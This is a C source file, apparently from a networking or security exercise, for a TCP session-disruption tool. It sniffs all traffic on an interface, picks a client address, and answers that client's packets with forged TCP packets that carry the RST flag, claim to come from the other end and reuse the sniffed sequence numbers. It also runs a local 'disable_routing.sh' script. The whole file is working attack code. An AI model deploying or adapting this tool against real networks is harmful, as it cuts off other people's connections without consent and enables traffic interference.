#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>

#define INTERFACE_NAME "eth0"
#define ACK_ON 1
#define SYN_ON 1
#define PSH_ON 1
#define RESET_ON 1
#define ACK_OFF 0
#define SYN_OFF 0
#define PSH_OFF 0
#define RESET_OFF 0

struct sockaddr_in source, dest;
char *client_ip = "";

struct pseudoTCPPacket {
  uint32_t srcAddr, dstAddr;
  uint16_t TCP_len;
  uint8_t zero, protocol;
};

int SendPacket(int socket_fd, char *packet, struct sockaddr_in addr_in) {
    struct iphdr *iphdr = (struct iphdr*)packet;
    return sendto(socket_fd, iphdr, iphdr->tot_len, 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
}

unsigned short Csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum>>16) + (sum & 0xffff);
    sum = sum + (sum>>16);
    return (short)(~sum);
}

void FillPacket(char *srcIP, char *dstIP, u_int16_t dstPort, u_int16_t srcPort, u_int32_t syn, u_int16_t ack, u_int16_t psh, u_int32_t seq, u_int32_t ack_seq, u_int16_t rst, const char *data, char *packet, uint32_t packet_size) {
    struct iphdr *ipHdr;
    struct tcphdr *tcpHdr;
    char *pseudo_packet;
    struct pseudoTCPPacket pTCPPacket;
  
    int data_length = strlen(data);
  
    memset(packet, 0, packet_size);
    ipHdr = (struct iphdr*)packet;
    tcpHdr = (struct tcphdr*)(packet + sizeof(struct iphdr));
  
    memcpy((char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, data_length);
    u_int16_t ipHeaderTotalLength = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_length;

    ipHdr->ihl = 5;
    ipHdr->version = 4;
    ipHdr->tos = 0x10;
    ipHdr->tot_len = ipHeaderTotalLength;
    ipHdr->id = htons(0xa89e);
    ipHdr->frag_off = htons(0x4000);
    ipHdr->ttl = 0x40;
    ipHdr->protocol = IPPROTO_TCP;
    ipHdr->saddr = inet_addr(srcIP);
    ipHdr->daddr = inet_addr(dstIP);
    ipHdr->check = Csum((unsigned short *) packet, ipHdr->tot_len);

    tcpHdr->source = htons(srcPort);
    tcpHdr->dest = htons(dstPort);
    tcpHdr->seq = htonl(seq);
    tcpHdr->ack_seq = htonl(ack_seq);
    tcpHdr->res1 = 0;
    tcpHdr->doff = 0x5;
    tcpHdr->fin = 0;
    tcpHdr->syn = syn;
    tcpHdr->rst = rst;
    tcpHdr->psh = psh;
    tcpHdr->ack = ack;
    tcpHdr->urg = 0;
    tcpHdr->res2 = 0;
    tcpHdr->window = htons(229);
    tcpHdr->urg_ptr = 0;

    pTCPPacket.srcAddr = inet_addr(srcIP);
    pTCPPacket.dstAddr = inet_addr(dstIP);
    pTCPPacket.zero = 0;
    pTCPPacket.protocol = IPPROTO_TCP;
    pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + data_length);
    pseudo_packet = (char*)malloc((int)(sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + data_length));
    memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + data_length);
    memcpy(pseudo_packet, (char*)&pTCPPacket, sizeof(struct pseudoTCPPacket));
    memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + data_length);
    tcpHdr->check = (Csum((unsigned short*)pseudo_packet, (int)(sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) +  data_length)));
    free(pseudo_packet);
    printf("\n");
}

void DisruptSession(struct iphdr *iphdr, struct tcphdr *tcphdr) {
    char *cmd = "";
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(cmd) + 1;
    struct sockaddr_in addr_in;
    addr_in.sin_family = AF_INET;
    addr_in.sin_port = tcphdr->source;
    source.sin_addr.s_addr = iphdr->saddr;
    dest.sin_addr.s_addr = iphdr->daddr;
    inet_pton(AF_INET, inet_ntoa(source.sin_addr), &(addr_in.sin_addr));
    void *packet = malloc(packet_size);
    uint32_t ack_inc = 0, seq_inc = 0;
    int sock = -1;
    int one = 1;

    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error while creating socket\n");
        exit(-1);
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
        perror("Error while setting socket options\n");
        exit(-1);
    }

    printf("\nReceived {\"srcIP\":\"%s\", ", inet_ntoa(source.sin_addr));
    printf("\"dstIP\":\"%s\", ", inet_ntoa(dest.sin_addr));
    printf("\"dstPort\":%u, ", ntohs(tcphdr->dest));
    printf("\"srcPort\":%u, ", ntohs(tcphdr->source));
    printf("\"SYN\":%d, ", tcphdr->syn);
    printf("\"ACK\":%d, ", tcphdr->ack);
    printf("\"PSH\":%d, ", tcphdr->psh);
    printf("\"RST\":%d, ", tcphdr->rst);
    printf("\"ACK_NUM\":%u, ", ntohl(tcphdr->ack_seq));
    printf("\"SYN_NUM\":%u}\n", ntohl(tcphdr->seq));

    printf("Sending {\"srcIP\":\"%s\", ", inet_ntoa(dest.sin_addr));
    printf("\"dstIP\":\"%s\", ", inet_ntoa(source.sin_addr));
    printf("\"dstPort\":%u, ", ntohs(tcphdr->source));
    printf("\"srcPort\":%u, ", ntohs(tcphdr->dest));
    printf("\"SYN\":%d, ", SYN_OFF);
    printf("\"ACK\":%d, ", ACK_ON);
    printf("\"PSH\":%d, ", PSH_ON);
    printf("\"RST\":%d, ", RESET_ON);
    printf("\"ACK_NUM\":%u, ", ntohl(tcphdr->seq) + seq_inc);
    printf("\"SYN_NUM\":%u, ", ntohl(tcphdr->ack_seq) + ack_inc);
    printf("\"data\":\"%s\"}\n\n", cmd);
    
    char *dstTemp = inet_ntoa(dest.sin_addr);
    char *dstAddress = malloc(strlen(dstTemp) + 1);
    strncpy(dstAddress, dstTemp, strlen(dstTemp) + 1);

    char *srcTemp = inet_ntoa(source.sin_addr);
    char *srcAddress = malloc(strlen(srcTemp) + 1);
    strncpy(srcAddress, srcTemp, strlen(srcTemp) + 1);

    int i = 1, packetAmount = 1;
    while(i <= packetAmount) {
        FillPacket(dstAddress, srcAddress, ntohs(tcphdr->source), ntohs(tcphdr->dest), SYN_OFF, ACK_OFF, PSH_ON, ntohl(tcphdr->ack_seq) + seq_inc, ntohl(tcphdr->seq) + ack_inc, RESET_ON, cmd, packet, packet_size);
        packetAmount--;
    }

    system("./disable_routing.sh");
    sleep(1);

    //Send out the packet
    printf("Sending PSH Packet %d of %d! Result: %d\n", i, packetAmount+1, SendPacket(sock, packet, addr_in));
    ack_inc += strlen(cmd) + 1;
    sleep(1);
}

void ProcessPacket(unsigned char* buffer) {
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    if(iph->protocol == 6) {
        struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
        struct tcphdr *tcph = (struct tcphdr*)(buffer + iph->ihl*4 + sizeof(struct ethhdr));

        memset(&source, 0, sizeof(source));
        source.sin_addr.s_addr = iph->saddr;

        memset(&dest, 0, sizeof(dest));
        dest.sin_addr.s_addr = iph->daddr;
        
        if(!strcmp(client_ip,"")) {
            int i = 0;
            char *found, *whoIS = strdup(inet_ntoa(source.sin_addr));
            while((found = strsep(&whoIS,"."))!= NULL) {
                if(i == 2 && 0 == atoi(found)) {
                    client_ip = strdup(inet_ntoa(source.sin_addr));
                    break;
                }
                i++;
            }
        }
        
        if(!strcmp(client_ip,inet_ntoa(source.sin_addr)))
            DisruptSession(iph, tcph);
    }
}

int main(void) {
    int saddr_size, data_size;
    struct sockaddr saddr;
    unsigned char *buffer = (unsigned char*)malloc(65536);
    int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) ;
    setsockopt(sock_raw, SOL_SOCKET, SO_BINDTODEVICE, INTERFACE_NAME, strlen(INTERFACE_NAME)+1);
    if(sock_raw < 0)
        perror("Socket Error");
    while(1) {
        saddr_size = sizeof saddr;
        data_size = recvfrom(sock_raw, buffer, 65536, 0, &saddr, (socklen_t*)&saddr_size);
        if(data_size <0)
            printf("Recvfrom error, failed to get packets\n");
        ProcessPacket(buffer);
    }
    close(sock_raw);
    return 0;
}